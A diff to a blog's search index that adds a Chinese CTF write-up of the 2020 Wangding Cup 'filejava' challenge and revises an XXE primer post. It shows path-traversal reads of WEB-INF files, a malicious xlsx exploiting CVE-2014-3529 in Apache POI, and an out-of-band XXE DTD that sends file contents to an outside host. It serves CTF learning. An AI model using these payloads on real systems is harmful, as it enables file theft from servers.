@@ -1,11 +1,95 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2020网鼎杯filejava（Javaweb、CVE-2014-3529）</title>
+    <url>/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/</url>
+    <content><![CDATA[<p>本来这个题想放到初始XML那一篇里面的，发现有一些Javaweb知识后就把它单独列出来了</p>
+<h3 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h3><p>目录穿越漏洞、利用xlsx构造xml</p>
+<p>在随意上传一个文件后，显示文件下载地址 <code>./DownloadServlet?filename=c5293886-04c4-48ff-bfeb-602ab05b6478_1.phtml</code></p>
+<p>比赛的时候因为对Javaweb了解太少，不知道目录结构，所以没想到去读取哪些文件</p>
+<p>这里写一下Javaweb的大致目录结构：(源自CSDN上的<a href="https://blog.csdn.net/pan_junbiao/article/details/87865408" target="_blank" rel="noopener">pan_junbiao</a>师傅和<a href="https://blog.csdn.net/qq_33689414/article/details/56489930" target="_blank" rel="noopener">张行之</a>师傅)</p>
+<blockquote>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" data-src="https://img-blog.csdnimg.cn/20190221174700993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Bhbl9qdW5iaWFv,size_16,color_FFFFFF,t_70" src="/img/loading.gif" class="lazyload" title="img"></a></p>
+<p>（1）Java Resources</p>
+<p>​    src：用来存放Java源文件。</p>
+<p>​    Libraries：存放的是Tomcat及JRE中的jar包。</p>
+<p>（2）build：自动编译.java文件的目录。</p>
+<p>（3）WebContent（WebRoot）：是这个Web应用的顶层目录，也称为文档根目录，由一下部分组成。</p>
+<p>​    META-INF：系统自动生成，存放系统描述信息。</p>
+<p>​    静态文件：包括所有的HTML网页、CSS文件、图像文件等。一般按功能已文件夹形式分类，例如，图像文件集中存储在images目录中。</p>
+<p>​    JSP文件：利用JSP可以很方便地在页面中生成动态的内容，使Web应用可以输出动态页面。</p>
+<p>​    WEB-INF：该目录存在于文档根目录下。但是，该目录不能被引用，也就是说，该目录下存放的文件无法对外发布，当然就无法被用户访问到了。WEB-INF目录由以下几部分组成。</p>
+<p>​        classes：存放Java字节码文件的目录。</p>
+<p>​        lib：用于存放该工程用到的库。它包含Web应用所需要的.jar或者.zip文件，例如：mysql-connector-java-8.0.14.jar（MySQL数据库的驱动程序）</p>
+<p>​        web.xml：应用程序的部署描述符，web工程的配置文件，完成用户请求的逻辑名称到真正的servlet类的映射。Web应用的初始化配置文件，非常重要，不要将其删除或者随意修改。</p>
+<p>  凡是客户端能访问的资源(<em>html或</em>.jpg)必须跟WEB-INF在同一目录，即放在Web根目录下的资源，从客户端是可以通过URL地址直接访问的。</p>
+</blockquote>
+<p>下面我们读取一下web.xml文件<code>?filename=../../../../WEB-INF/web.xml</code>，得到</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/3.png" src="/img/loading.gif" class="lazyload"></a>    
+
+<p>这里还需要了解什么是<servlet-class>，它是里面定义了用户请求的逻辑名称到真正servlet类的映射。</servlet-class></p>
+<blockquote>
+<p>WEB-INF/classes 目录包含了所有的 Servlet 类和其他类文件，类文件所在的目录结构与他们的包名称匹配。</p>
+</blockquote>
+<p>因此按web.xml给出的路径去把class文件下载下来</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure></div>
+
+<p>class文件可以拿JD-GUI打开，代码审计，发现<code>UploadServlet.class</code>中，有对文件名和后缀的判断</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/4.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>图中先判断了文件开头是否为“excel-” 然后又判断了文件尾是否xlsx；</p>
+<p>同时这里是Java环境，提示<code>poi-ooxml-3.10 has something wrong</code>，所以可以根据版本推测其漏洞也就是CVE-2014-3529</p>
+<p>Apache POI OpenXML parser小科普：</p>
+<blockquote>
+<p>  Apache POI 是 Apache 软件基金会的开源项目，POI 提供 API 接口给 Java 程序对 Microsoft office 格式文档读写能力。</p>
+<p>   Microsoft Office从2007版本引入了新的开放的XML文件格式，新的XML文件格式基于压缩的ZIP文件格式规范，由许多部分组成。我们可以将其解压缩到特定的文件夹中来查看其包含的文件夹和文件，可以发现其中多数是描述工作簿数据、元数据、文档信息的XML文件。所以不正确的读取07格式的Microsoft office 格式文件也存在着 XXE 攻击的可能性。</p>
+</blockquote>
+<p>因此我们可以想到利用xlsx来构造xml进行文件读取</p>
+<p>这里可以用昨天看的<a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">无回显读取</a></p>
+<blockquote>
+<p><strong>以下调用过程：</strong></p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 BTIS.dtd ，有点类似于将 BTIS.dtd 包含进来，然后 %int 调用 BTIS.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p>但是为啥我实体的值中有%了，没有用<code>&amp;#37;</code>，也可以</p>
+<p>还有下面的<code>&lt;!DOCTYPE BTIS [</code> 需要闭合<code>&lt;!DOCTYPE convert [</code> 不用闭合，有时间好好研究研究xml的规则（听同学说短学期MFC要用xml的，当时偷懒没用，现在人傻了。。。</p>
+</blockquote>
+<p>开个buu靶机，记一下内网ip(ifconfig)，写个dtd文件进去，拿参数实体拼接访问</p>
+<p>先写靶机上写一个dtd文件</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;174.1.80.146:7788?btis&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>
+
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/6.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>到这服务器监听7788端口就行了，等文件上传后就会在服务器上回显flag了</p>
+<p>之后我们新建一个xlsx文件，改后缀为zip：</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/5.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>编辑<code>[Content_Types].xml</code></p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">BTIS</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://174.1.80.146/BTIS.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span><span class="tag">&lt;<span class="name">BTIS</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后把后缀改回来，并且把文件名改为<code>excel-1</code>类似的来绕过对文件名开头的检测（要用excel-开头)</p>
+<p>后面上传文件就行了(淦、为啥我上传好几次，上传不上去，老是卡，终于好了)</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/7.png" src="/img/loading.gif" class="lazyload"></a>
+
+
+
+<p>补充：如果尝试直接去读flag的话是行不通的，因为DownloadServlet中有过滤：</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String fileName &#x3D; request.getParameter(&quot;filename&quot;);</span><br><span class="line">fileName &#x3D; new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);</span><br><span class="line">System.out.println(&quot;filename&#x3D;&quot; + fileName);</span><br><span class="line">if (fileName !&#x3D; null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) &#123;</span><br><span class="line">  request.setAttribute(&quot;message&quot;, &quot;&quot;);</span><br><span class="line">  request.getRequestDispatcher(&quot;&#x2F;message.jsp&quot;).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  </span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>XXE</tag>
+        <tag>Javaweb</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初识XML(XXE)</title>
-    <url>/2020/05/13/%E5%88%9D%E8%AF%86XML/</url>
+    <url>/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/</url>
     <content><![CDATA[<h3 id="基础知识（https-xz-aliyun-com-t-3357）"><a href="#基础知识（https-xz-aliyun-com-t-3357）" class="headerlink" title="基础知识（https://xz.aliyun.com/t/3357）"></a>基础知识（<a href="https://xz.aliyun.com/t/3357）" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357）</a></h3><p>1.DTD格式规范（元素-&gt;xml标签，实体-&gt;xml内容）</p>
 <p>2.内部实体、外部实体、通用实体、参数实体</p>
-<p>3.有回显、无回显读取文件（无回显可以把detd放到自己vps上，从而将内容回显到vps上）</p>
+<p>3.有回显、无回显读取文件（无回显可以把dtd放到自己vps上，从而将内容回显到vps上）</p>
 <p>4.参数实体+ “<!--[CDATA["和 “]]-->”实现连续引用拼接（读取文件时里面有引起xml格式混淆的字符串）</p>
 <p>5.内网相关（端口扫描、内网探测）</p>
 <p>……</p>
@@ -21,13 +105,15 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">BTIS</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>0<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>这里引用上面那篇文张作者的一张图：（常见平台的不同协议）</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" src="/img/loading.gif" class="lazyload" title="img"></a></p>
 <h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>这个就要用到内网探测了。（SSRF？）</p>
 <p>我们可以尝试读取：<code>/proc/net/arp</code> 或者 <code>/etc/host</code> 或者 <code>/etc/network/interfaces</code>，来获取内网存活的主机</p>
-<a href="/2020/05/13/%E5%88%9D%E8%AF%86XML/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>看到两个，尝试访问一下，第一个好像⑧太行，访问第二个得到flag</p>
-<a href="/2020/05/13/%E5%88%9D%E8%AF%86XML/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML/2.png" src="/img/loading.gif" class="lazyload"></a>]]></content>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/2.png" src="/img/loading.gif" class="lazyload"></a>
+
+]]></content>
       <categories>
         <category>Web</category>
       </categories>
